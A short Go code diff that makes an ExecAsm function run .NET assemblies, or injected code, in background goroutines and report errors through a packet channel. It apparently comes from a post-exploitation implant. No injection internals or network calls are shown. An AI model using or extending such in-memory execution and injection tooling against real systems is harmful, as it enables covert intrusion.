@@ -57,9 +57,21 @@ func ExecAsm(b []byte, isDllX64 bool, ignoreToken bool) error {
 	_, _, _, description, _, _, _ := parseExecAsm(b)
 	// use go impl to execute C# assembly
 	if string(description) == ".NET assembly" {
-		return execAsmGo(b)
+		go func() {
+			err := execAsmGo(b)
+			if err != nil {
+				packet.ErrorMessage(err.Error())
+			}
+		}()
+		return nil
 	}
-	return execAsmInject(b, isDllX64, ignoreToken)
+	go func() {
+		err := execAsmInject(b, isDllX64, ignoreToken)
+		if err != nil {
+			packet.ErrorMessage(err.Error())
+		}
+	}()
+	return nil
 }
 
 func execAsmInject(b []byte, isDllX64 bool, ignoreToken bool) error {
